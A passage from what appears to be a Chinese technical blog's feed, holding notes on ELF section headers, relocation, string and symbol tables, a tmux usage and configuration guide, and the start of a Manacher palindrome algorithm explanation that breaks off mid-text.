punctuation">(</span>exclude<span class="token punctuation">)</span>,  D <span class="token punctuation">(</span>mbind<span class="token punctuation">)</span>, p <span class="token punctuation">(</span>processor specific<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>readelf输出的结果就是ELF文件段表的内容，<strong>段表是一个以”Elf32_Shdr“结构体为元素的数组。数组元素的个数等于段的个数，每个”Elf32_Shdr“结构体对应一个段。</strong>”Elf32_Shdr“又被称为段描述符（Section Descriptor），”Elf32_Shdr“的各个成员的含义如下图：</p><p><img src="/2023/04/18/elf-wen-jian-jie-gou/1.png" alt="Elf32_Shdr结构体"></p><h3 id="sh-type"><a href="#sh-type" class="headerlink" title="sh_type"></a>sh_type</h3><p>段的类型（sh_type）。<strong>段名只是在链接和编译过程中有意义，但它并不能真正表示段的类型。</strong>而且段名是可以通过代码更改的，对于编译器和链接器来说，主要决定短的属性的是段的类型（sh_type）和标志位（sh_flag），段的类型相关常量以SHT_开头，其中 SHT 是 <strong>Section Header Table</strong> 的简写：</p><table><thead><tr><th align="left">名称</th><th align="center">取值</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">SHT_NULL</td><td align="center">0</td><td align="left">该类型节区是非活动的，这种类型的节头中的其它成员取值无意义。</td></tr><tr><td align="left">SHT_PROGBITS</td><td align="center">1</td><td align="left">该类型节区包含程序定义的信息，它的格式和含义都由程序来决定。</td></tr><tr><td align="left">SHT_SYMTAB</td><td align="center">2</td><td align="left">该类型节区包含一个符号表（<strong>SYMbol TABle</strong>）。目前目标文件对每种类型的节区都只 能包含一个，不过这个限制将来可能发生变化。 一般，SHT_SYMTAB 节区提供用于链接编辑（指 ld 而言） 的符号，尽管也可用来实现动态链接。</td></tr><tr><td align="left">SHT_STRTAB</td><td align="center">3</td><td align="left">该类型节区包含字符串表（ <strong>STRing TABle</strong> ）。</td></tr><tr><td align="left">SHT_RELA</td><td align="center">4</td><td align="left">该类型节区包含显式指定位数的重定位项（ <strong>RELocation entry with Addends</strong> ），例如，32 位目标文件中的 Elf32_Rela 类型。此外，目标文件可能拥有多个重定位节区。</td></tr><tr><td align="left">SHT_HASH</td><td align="center">5</td><td align="left">该类型节区包含符号哈希表（ <strong>HASH table</strong> ）。</td></tr><tr><td align="left">SHT_DYNAMIC</td><td align="center">6</td><td align="left">该类型节区包含动态链接的信息（ <strong>DYNAMIC linking</strong> ）。</td></tr><tr><td align="left">SHT_NOTE</td><td align="center">7</td><td align="left">该类型节区包含以某种方式标记文件的信息（<strong>NOTE</strong>）。</td></tr><tr><td align="left">SHT_NOBITS</td><td align="center">8</td><td align="left">该类型节区不占用文件的空间，其它方面和 SHT_PROGBITS 相似。尽管该类型节区不包含任何字节，其对应的节头成员 sh_offset 中还是会包含概念性的文件偏移。</td></tr><tr><td align="left">SHT_REL</td><td align="center">9</td><td align="left">该类型节区包含重定位表项（<strong>RELocation entry without Addends</strong>），不过并没有指定位数。例如，32 位目标文件中的 Elf32_rel 类型。目标文件中可以拥有多个重定位节区。</td></tr><tr><td align="left">SHT_SHLIB</td><td align="center">10</td><td align="left">该类型此节区被保留，不过其语义尚未被定义。</td></tr><tr><td align="left">SHT_DYNSYM</td><td align="center">11</td><td align="left">作为一个完整的符号表，它可能包含很多对动态链接而言不必 要的符号。因此，目标文件也可以包含一个 SHT_DYNSYM 节区，其中保存动态链接符号的一个最小集合，以节省空间。</td></tr><tr><td align="left">SHT_LOPROC</td><td align="center">0X70000000</td><td align="left">此值指定保留给处理器专用语义的下界（ <strong>LOw PROCessor-specific semantics</strong> ）。</td></tr><tr><td align="left">SHT_HIPROC</td><td align="center">OX7FFFFFFF</td><td align="left">此值指定保留给处理器专用语义的上界（ <strong>HIgh PROCessor-specific semantics</strong> ）。</td></tr><tr><td align="left">SHT_LOUSER</td><td align="center">0X80000000</td><td align="left">此值指定保留给应用程序的索引下界。</td></tr><tr><td align="left">SHT_HIUSER</td><td align="center">0X8FFFFFFF</td><td align="left">此值指定保留给应用程序的索引上界。</td></tr></tbody></table><h3 id="sh-flags"><a href="#sh-flags" class="headerlink" title="sh_flags"></a>sh_flags</h3><p>节头中 <code>sh_flags</code> 字段的每一个比特位都可以给出其相应的标记信息，其定义了对应的节区的内容是否可以被修改、被执行等信息。如果一个标志位被设置，则该位取值为 1，未定义的位都为 0。目前已定义值如下，其他值保留。</p><table><thead><tr><th align="left">名称</th><th align="left">值</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">SHF_WRITE</td><td align="left">0x1</td><td align="left">这种节包含了进程运行过程中可以被写的数据。</td></tr><tr><td align="left">SHF_ALLOC</td><td align="left">0x2</td><td align="left">这种节在进程运行时占用内存。对于不占用目标文件的内存镜像空间的某些控制节，该属性处于关闭状态 (off)。</td></tr><tr><td align="left">SHF_EXECINSTR</td><td align="left">0x4</td><td align="left">这种节包含可执行的机器指令（<strong>EXECutable INSTRuction</strong>）。</td></tr><tr><td align="left">SHF_MASKPROC</td><td align="left">0xf0000000</td><td align="left">所有在这个掩码中的比特位用于特定处理器语义。</td></tr></tbody></table><h3 id="sh-link-amp-sh-info"><a href="#sh-link-amp-sh-info" class="headerlink" title="sh_link &amp; sh_info"></a>sh_link &amp; sh_info</h3><p>当节区类型的不同的时候，sh_link 和 sh_info 也会具有不同的含义，如果段的类型是链接相关的（不论是动态链接还是静态链接），比如重定位表、符号表等，那么sh_link和sh_info这两个成员所包含的意义如下，对于其他类型的段，这两个成员没有意义：。</p><table><thead><tr><th align="left">sh_type</th><th align="left">sh_link</th><th align="left">sh_info</th></tr></thead><tbody><tr><td align="left">SHT_DYNAMIC</td><td align="left">节区中使用的字符串表的节头索引</td><td align="left">0</td></tr><tr><td align="left">SHT_HASH</td><td align="left">此哈希表所使用的符号表的节头索引</td><td align="left">0</td></tr><tr><td align="left">SHT_REL/SHT_RELA</td><td align="left">与符号表相关的节头索引</td><td align="left">重定位应用到的节的节头索引</td></tr><tr><td align="left">SHT_SYMTAB/SHT_DYNSYM</td><td align="left">操作系统特定信息，Linux 中的 ELF 文件中该项指向符号表中符号所对应的字符串节区在 Section Header Table 中的偏移。</td><td align="left">操作系统特定信息</td></tr><tr><td align="left">other</td><td align="left"><code>SHN_UNDEF</code></td><td align="left">0</td></tr></tbody></table><h2 id="重定位表"><a href="#重定位表" class="headerlink" title="重定位表"></a>重定位表</h2><p>在通过前面使用readelf查看时，发现有一个叫做.rel.text的段，类型是”SHT_REL“，是一个重定位表（Relocation Table）。<strong>链接器在处理目标文件时，需要对目标文件中的的位置进行重定位，即代码段和数据段中那些绝对地址的引用位置。这些重定位信息都记录在ELF文件的重定位表中。每个段都有一个重定位表，例如”.rel.text“是”text“段的重定位表。</strong></p><p>一个重定位表是ELF中的一个段，这个段的类型是”SHT_REL“类型，<strong>”sh_link“表示符号表的下标，它的”sh_info“表示它作用于哪个段</strong>。比如”.rel.text“作用于”.text“段，而”.text“段的下标为”1“，那么”.rel.text“的”sh_info“为”1“。</p><h2 id="字符串表"><a href="#字符串表" class="headerlink" title="字符串表"></a>字符串表</h2><p>ELF文件中用到很多字符串，如段名、变量名、函数名等。但是字符串长度不一，所以将这些字符串存放到一个表中，然后使用字符串在表中的偏移来引用：</p><p>偏移+0+1+2+3+4+5+6+7+8+9<br>+0    \0 h   e  l    l   o w  o  r   l<br>+10  d \0  M y   v   a  r   i  a       b<br>+20  l   e  \0<br>对应偏移的字符串为：</p><p>偏移字符串<br>0空字符串<br>1helloworld<br>6world<br>12  Myvariable<br>这样在ELF文件中，引用字符串只需给出一个数字下标就行，单个字符串都以\0结尾，所以不需要考虑长度问题。ELF中两个表为：</p><ul><li>字符串表（String Table）：常见段名为”.strtab“</li><li>段表字符串表（Section Header String Table）：常见段名为”.shstrtab“</li></ul><p>通过分析ELF文件头，可以得到段表和段表字符串表的位置。</p><h1 id="链接的接口——符号"><a href="#链接的接口——符号" class="headerlink" title="链接的接口——符号"></a>链接的接口——符号</h1><p><strong>链接过程本质是把多个不同的文件通过函数和变量引用的方式链接起来</strong>。</p><p>举个栗子：目标文件B需要用到目标文件A中的函数”func“，那么成目标文件A定义（define）了函数”func“，目标文件B引用（reference）了目标文件A中的函数”func“。这两个概念同样适用于变量。<strong>在连接中，将函数和变量统称为符号（Symbol），函数名或变量名就是符号名（Symbol Name）</strong></p><p>在链接过程中可以将符号看做粘合剂，所以符号需要统一管理，**每个目标文件中都会有一个相应的符号表（Symbol Table），表中记录了目标文件所用到的所有符号，每个定义的符号有一个对应的值，叫做符号值（Symbol Value），<font color="red">符号是就是变量和函数的地址</font>**，下面是符号表中所有符号的分类：</p><ul><li><strong>定义在本目标文件的全局符号，可以被其他目标引用，例如SimpleSection.o中的”func1“、”main“和”global_init_var“。</strong></li><li><strong>在本目标文件中引用的全局符号，却没有定义在本目标文件，一般叫做外部符号（External Symbol），例如：SimpleSection.o中的”printf“</strong></li><li>段名，这种符号往往由编译器产生，它的值就是该段的起始地址，例如SimpleSection.o中的”.text“、”.data“等</li><li>局部符号，这类符号只在编译单元内部可见。例如：SimpleSection.o里面的”static_var“和”static_var2“</li><li>行号信息，即目标文件指令与源代码中代码行对应关系，可选</li></ul><p>值得关注的是前两个，在链接过程中只关心全局符号的链接，局部符号、段名、行号都是次要的。</p><h2 id="ELF符号表结构"><a href="#ELF符号表结构" class="headerlink" title="ELF符号表结构"></a>ELF符号表结构</h2><p>ELF文件中的符号表往往是文件中的一个段，段名一般叫”.symtab“。表结构是一个Elf32_Sym结构的数组，每个Elf32_Sym结构对应一个符号。Elf32_Sym结构定义如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">{</span>  Elf32_Word st_name<span class="token punctuation">;</span>  Elf32_Addr st_value<span class="token punctuation">;</span>  Elf32_Word st_size<span class="token punctuation">;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> st_info<span class="token punctuation">;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> sy_other<span class="token punctuation">;</span>  Elf32_Half st_shndx<span class="token punctuation">;</span><span class="token punctuation">}</span> Elf32_Sym<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>成员定义如下：</p><ul><li>st_name：符号名。这个成员包含了该符号名在字符串表中的下标</li><li>st_value：符号相对应的值。这个值和符号有关，可能是一个绝对值，也可能是一个地址等，不同的符号对应的值含义不同</li><li>st_size：符号大小，对于包含数据的符号，这个值是该数据类型的大小，比如一个double类型的符号占用8个字节，如果该值为0，则表示该符号大小为0或位置</li><li>st_info：符号类型和绑定信息</li><li>st_other：该成员目前为0，没用</li><li>st_shndx：符号所在段</li></ul>]]></content>
      
      
      <categories>
          
          <category> 《程序员的自我修养》 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ELF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tmux使用手册</title>
      <link href="/2023/04/17/tmux/"/>
      <url>/2023/04/17/tmux/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><p>转载自：<a href="http://louiszhai.github.io/2017/09/30/tmux/#Tmux%E5%BF%AB%E6%8D%B7%E6%8C%87%E4%BB%A4">Tmux使用手册 | louis blog (louiszhai.github.io)</a></p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>Linux中：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> tmux<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><p>tmux采用C/S模型构建，输入tmux命令就相当于开启了一个服务器，此时默认将新建一个会话，然后会话中默认新建一个窗口，窗口中默认新建一个面板。会话、窗口、面板之间的联系如下：</p><p>一个tmux <code>session</code>（会话）可以包含多个<code>window</code>（窗口），窗口默认充满会话界面，因此这些窗口中可以运行相关性不大的任务。</p><p>一个<code>window</code>又可以包含多个<code>pane</code>（面板），窗口下的面板，都处于同一界面下，这些面板适合运行相关性高的任务，以便同时观察到它们的运行情况。</p><p><img src="/2023/04/17/tmux/0.png"></p><h1 id="会话"><a href="#会话" class="headerlink" title="会话"></a>会话</h1><h2 id="新建会话"><a href="#新建会话" class="headerlink" title="新建会话"></a>新建会话</h2><p>命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tmux <span class="token comment"># 新建一个无名称的会话 </span>tmux new <span class="token parameter variable">-s</span> session_name <span class="token comment"># 新建一个名称为seccsion_name的会话</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="断开会话"><a href="#断开会话" class="headerlink" title="断开会话"></a>断开会话</h2><p><strong>断开会话同时下次还能接着用</strong>，使用detach命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tmux detach <span class="token comment"># 断开当前会话，会话在后台运行</span>快捷键：Ctrl+b + d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="进入之前的会话"><a href="#进入之前的会话" class="headerlink" title="进入之前的会话"></a>进入之前的会话</h2><p>断开会话后，想要接着上次留下的现场继续工作，可以使用tmux的attach命令，命令为为：</p><p><code>tmux attach-session -t session-name</code>，可简写为<code>tmux a -t session-name</code> 或 <code>tmux a</code>。通常我们使用如下两种方式之一即可：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tmux a <span class="token comment"># 默认进入第一个会话</span>tmux a <span class="token parameter variable">-t</span> session_name <span class="token comment"># 进入到名称为session_name的会话</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="关闭会话"><a href="#关闭会话" class="headerlink" title="关闭会话"></a>关闭会话</h2><p>会话的使命完成后，一定是要关闭的。我们可以使用tmux的kill命令，kill命令有</p><ul><li><code>kill-pane</code></li><li><code>kill-server</code></li><li><code>kill-session</code></li><li><code>kill-window</code></li></ul><p>其中<code>kill-session</code>的语法为<code>tmux kill-session -t session-name</code>。如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tmux kill-session <span class="token parameter variable">-t</span> session_name <span class="token comment"># 关闭session_name会话</span>tmux kill-server <span class="token comment"># 关闭服务器，所有的会话都将关闭</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="查看所有的会话"><a href="#查看所有的会话" class="headerlink" title="查看所有的会话"></a>查看所有的会话</h2><p>管理会话的第一步就是要查看所有的会话，我们可以使用如下命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tmux list-session <span class="token comment"># 查看所有会话</span>tmux <span class="token function">ls</span> <span class="token comment"># 查看所有会话，提倡使用简写形式</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>如果刚好处于会话中怎么办？别担心，我们可以使用对应的tmux快捷键<code>Ctrl+b</code> + <code>s</code>，此时tmux将打开一个会话列表，按上下键(⬆︎⬇︎)或者鼠标滚轮，可选中目标会话，按左右键（⬅︎➜）可收起或展开会话的窗口，选中目标会话或窗口后，按回车键即可完成切换。</p><p><img src="/2023/04/17/tmux/1.png"></p><h1 id="Tmux快捷键"><a href="#Tmux快捷键" class="headerlink" title="Tmux快捷键"></a>Tmux快捷键</h1><p>关于快捷指令，首先要认识到的是：tmux的所有指令，<strong>都包含同一个前缀，默认为<code>Ctrl+b</code>，输入完前缀过后，控制台激活，命令按键才能生效。即我们要先按下前缀并松开后才按命令按键</strong></p><p>表一：系统指令：</p><table><thead><tr><th align="center">前缀</th><th align="center">指令</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>?</code></td><td align="center">显示快捷键帮助文档</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>d</code></td><td align="center">断开当前会话</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>D</code></td><td align="center">选择要断开的会话</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>Ctrl+z</code></td><td align="center">挂起当前会话</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>r</code></td><td align="center">强制重载当前会话</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>s</code></td><td align="center">显示会话列表用于选择并切换</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>:</code></td><td align="center">进入命令行模式，此时可直接输入<code>ls</code>等命令</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>[</code></td><td align="center">进入复制模式，按<code>q</code>退出</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>]</code></td><td align="center">粘贴复制模式中复制的文本</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>~</code></td><td align="center">列出提示信息缓存</td></tr></tbody></table><p>表二：窗口（window）指令：</p><table><thead><tr><th align="center">前缀</th><th align="center">指令</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>c</code></td><td align="center">新建窗口</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>&amp;</code></td><td align="center">关闭当前窗口（关闭前需输入<code>y</code> or <code>n</code>确认）</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>0~9</code></td><td align="center">切换到指定窗口</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>p</code></td><td align="center">切换到上一窗口</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>n</code></td><td align="center">切换到下一窗口</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>w</code></td><td align="center">打开窗口列表，用于且切换窗口</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>,</code></td><td align="center">重命名当前窗口</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>.</code></td><td align="center">修改当前窗口编号（适用于窗口重新排序）</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>f</code></td><td align="center">快速定位到窗口（输入关键字匹配窗口名称）</td></tr></tbody></table><p>表三：面板（pane）指令：</p><table><thead><tr><th align="center">前缀</th><th align="center">指令</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>"</code></td><td align="center">当前面板上下一分为二，下侧新建面板</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>%</code></td><td align="center">当前面板左右一分为二，右侧新建面板</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>x</code></td><td align="center">关闭当前面板（关闭前需输入<code>y</code> or <code>n</code>确认）</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>z</code></td><td align="center">最大化当前面板，再重复一次按键后恢复正常（v1.8版本新增）</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>!</code></td><td align="center">将当前面板移动到新的窗口打开（原窗口中存在两个及以上面板有效）</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>;</code></td><td align="center">切换到最后一次使用的面板</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>q</code></td><td align="center">显示面板编号，在编号消失前输入对应的数字可切换到相应的面板</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>{</code></td><td align="center">向前置换当前面板</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>}</code></td><td align="center">向后置换当前面板</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>Ctrl+o</code></td><td align="center">顺时针旋转当前窗口中的所有面板</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>方向键</code></td><td align="center">移动光标切换面板</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>o</code></td><td align="center">选择下一面板</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>空格键</code></td><td align="center">在自带的面板布局中循环切换</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>Alt+方向键</code></td><td align="center">以5个单元格为单位调整当前面板边缘</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>Ctrl+方向键</code></td><td align="center">以1个单元格为单位调整当前面板边缘（Mac下被系统快捷键覆盖）</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>t</code></td><td align="center">显示时钟</td></tr></tbody></table><p>tmux的丝滑分屏功能正是得益于以上系统、窗口、面板的快捷指令，只要你愿意，<strong>你就可以解除任意的快捷指令，然后绑上你喜欢的指令</strong>，当然这就涉及到它的可配置性了，请继续往下读。</p><h2 id="灵活的配置性"><a href="#灵活的配置性" class="headerlink" title="灵活的配置性"></a>灵活的配置性</h2><p>除了快捷指令外，tmux还提供了类似vim的配置性功能。可配置性是软件的一项进阶级功能，只有具备了可配置性，软件才有了鲜活的个性，用户才能体会到操作的快感。</p><h3 id="修改指令前缀"><a href="#修改指令前缀" class="headerlink" title="修改指令前缀"></a>修改指令前缀</h3><p>相信只要你用过几次tmux，就会发现<code>Ctrl+b</code>指令前缀，着实不太方便。这两个键相距太远，按键成本太高了。因此我们首先需要将它更换为距离更近的<code>Ctrl+a</code>组合键，或者不常用的 ` 键（当然其他键也是可以的）。</p><p><strong>tmux的用户级配置文件为<code>~/.tmux.conf</code>（没有的话就创建一个）</strong>，修改快捷指令，只需要增加如下三行即可。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">set</span> <span class="token parameter variable">-g</span> prefix C-a <span class="token comment">#</span>unbind C-b <span class="token comment"># C-b即Ctrl+b键，unbind意味着解除绑定</span><span class="token builtin class-name">bind</span> C-a send-prefix <span class="token comment"># 绑定Ctrl+a为新的指令前缀</span><span class="token comment"># 从tmux v1.6版起，支持设置第二个指令前缀</span>set-option <span class="token parameter variable">-g</span> prefix2 <span class="token variable"><span class="token variable">`</span> <span class="token comment"># 设置一个不常用的</span><span class="token variable">`</span></span>键作为指令前缀，按键更快些<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改的<code>~/.tmux.conf</code>配置文件有如下两种方式可以令其生效：(这里我是修改完配置文件后直接生效了)</p><ul><li>restart tmux。</li><li>在tmux窗口中，先按下<code>Ctrl+b</code>指令前缀，然后按下系统指令<code>:</code>，进入到命令模式后输入<code>source-file ~/.tmux.conf</code>，回车后生效。</li></ul><p>既然快捷指令如此方便，更为优雅的做法是新增一个加载配置文件的快捷指令 ，这样就可以随时随地load新的配置了，如下所示。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 绑定快捷键为r</span><span class="token builtin class-name">bind</span> r source-file ~/.tmux.conf <span class="token punctuation">\</span><span class="token punctuation">;</span> display-message <span class="token string">"Config reloaded.."</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>请特别注意，在已经创建的窗口中，即使加载了新的配置，旧的配置依然有效（只要你新加的功能没有覆盖旧的配置，因此如果你第一次绑定快捷指令为<code>x</code>键，然后又改为绑定<code>y</code>键，那么<code>x</code>和<code>y</code>都将有效），新建会话不受此影响，将直接采用新的配置。</p><p>既然我们已经迈出配置化的第一步，那么接下来我们可以做得更多。</p><h3 id="新增面板"><a href="#新增面板" class="headerlink" title="新增面板"></a>新增面板</h3><p>tmux中，使用最多的功能之一就是新增一个面板。水平方向新增面板的指令是 <code>prefix</code> + <code>"</code> ，垂直方向是 <code>prefix</code> + <code>%</code>，<code>"</code> 和 <code>%</code>需要两个键同时按下才能完成，加上指令前缀至少需要3~4次按键才能组成一个完整的指令，同时这个两个键也不够醒目和方便，因此我们可以绑定两个更常用的指令 <code>-</code>、<code>|</code>，如下所示：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">unbind <span class="token string">'"'</span><span class="token builtin class-name">bind</span> - splitw <span class="token parameter variable">-v</span> <span class="token parameter variable">-c</span> <span class="token string">'#{pane_current_path}'</span> <span class="token comment"># 垂直方向新增面板，默认进入当前目录</span>unbind %<span class="token builtin class-name">bind</span> <span class="token operator">|</span> splitw <span class="token parameter variable">-h</span> <span class="token parameter variable">-c</span> <span class="token string">'#{pane_current_path}'</span> <span class="token comment"># 水平方向新增面板，默认进入当前目录</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="开启鼠标支持"><a href="#开启鼠标支持" class="headerlink" title="开启鼠标支持"></a>开启鼠标支持</h3><p>默认情况下，tmux的多窗口之间的切换以及面板大小调整，需要输入指令才能完成，这一过程，涉及到的指令较多，而且操作麻烦，特别是面板大小调整，指令难以一步到位，这个时候开启鼠标支持就完美了。</p><p>对于tmux v2.1(2015.10.28)之前的版本，需加入如下配置：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">setw <span class="token parameter variable">-g</span> mode-mouse on <span class="token comment"># 支持鼠标选取文本等</span>setw <span class="token parameter variable">-g</span> mouse-resize-pane on <span class="token comment"># 支持鼠标拖动调整面板的大小(通过拖动面板间的分割线)</span>setw <span class="token parameter variable">-g</span> mouse-select-pane on <span class="token comment"># 支持鼠标选中并切换面板</span>setw <span class="token parameter variable">-g</span> mouse-select-window on <span class="token comment"># 支持鼠标选中并切换窗口(通过点击状态栏窗口名称)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>有的地方可能会出现<code>set-window-option</code>的写法，<code>setw</code>就是它的别名。</p><p>对于tmux v2.1及以上的版本，仅需加入如下配置：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">set-option <span class="token parameter variable">-g</span> mouse on <span class="token comment"># 等同于以上4个指令的效果</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>需要注意的是，开启鼠标支持后，iTem2默认的鼠标选中即复制功能需要同时按下 <code>Alt</code> 键，才会生效。</p><h1 id="lt-我暂时只需要这些功能-gt"><a href="#lt-我暂时只需要这些功能-gt" class="headerlink" title="<我暂时只需要这些功能>"></a>&lt;我暂时只需要这些功能&gt;</h1>]]></content>
      
      
      <categories>
          
          <category> tmux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tmux使用手册 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Manacher算法</title>
      <link href="/2023/04/14/manacher-suan-fa/"/>
      <url>/2023/04/14/manacher-suan-fa/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Manacher算法，又称🐎拉车算法，是用来求解：</p><p>在字符串str中，求出一条最长回文子串，时间复杂度O(n)。</p><h1 id="算法解析"><a href="#算法解析" class="headerlink" title="算法解析"></a>算法解析</h1><h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><p>中心扩散法+加速</p><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><h3 id="统一奇偶长度问题"><a href="#统一奇偶长度问题" class="headerlink" title="统一奇偶长度问题"></a>统一奇偶长度问题</h3><p>对于中心扩散法，存在一个问题，就是奇数长度的回文串与偶数长度的回文串求解不统一。</p><p>比如：对于<code>'abcbbcbba'</code>，如果我们以每个字符为中心向两边扩散，则会遗失长度为偶数的回文串。(当然我们可以再以相邻字符向两边扩散然后取最大值)</p><p>所以我们在字符串中加入辅助字符：</p><p><code>#a#b#c#b#b#c#b#b#a#</code>，然后向两边扩散，得到的长度len除2就是回文串长度。</p><p>对于上述字符串我们向两边扩散依次得到：<code>1 3 1 3 1 7 1 3 13 ...</code>所以最长回文子串长度为13/2 = 6，即<code>bcbbcb</code></p><h3 id="回文直径与回文半径数组"><a href="#回文直径与回文半径数组" class="headerlink" title="回文直径与回文半径数组"></a>回文直径与回文半径数组</h3><ul><li><p>字符i对应的回文直径为以字符i为中心的回文子串的长度（这里的字符串是加入了辅助字符的</p></li><li><p>回文半径=回文直径/2 + 1</p></li><li><p>定义回文半径数组P</p></li></ul><h3 id="扩散到最右边的回文右边界R"><a href="#扩散到最右边的回文右边界R" class="headerlink" title="扩散到最右边的回文右边界R"></a>扩散到最右边的回文右边界R</h3><p>初始<code>int R = -1</code>，从左向右扩散</p><p>比如对于：<code>#a#b#c#b#b#c#b#b#a#</code></p><p>第一次从0位置扩散：#  0~0       ==&gt; R=0</p><p>第二次从1位置扩散：#a#  0~2  ==&gt; R=2</p><p>第三次从2位置扩散：#  2~2       ==&gt; R=2</p><p>第四次从3位置扩散：#b#  2~4  ==&gt; R=4</p><p>……</p><h3 id="取得最远右边界R时的中心位置C"><a href="#取得最远右边界R时的中心位置C" class="headerlink" title="取得最远右边界R时的中心位置C"></a>取得最远右边界R时的中心位置C</h3><p>初始<code>int C = -1</code>，从左向右扩散</p><p>比如对于：<code>#a#b#c#b#b#c#b#b#a#</code></p><p>第一次从0位置扩散：#  0~0       ==&gt; C=0</p><p>第二次从1位置扩散：#a#  0~2  ==&gt; C=1</p><p>第三次从2位置扩散：#  2~2       ==&gt; C=2</p><p>第四次从3位置扩散：#b#  2~4  ==&gt; C=3</p><p>……</p><h2 id="算法加速"><a href="#算法加速" class="headerlink" title="算法加速"></a>算法加速</h2><p><code>str = #1#2#1#...</code>，<code>int R = -1</code>，<code>int C = 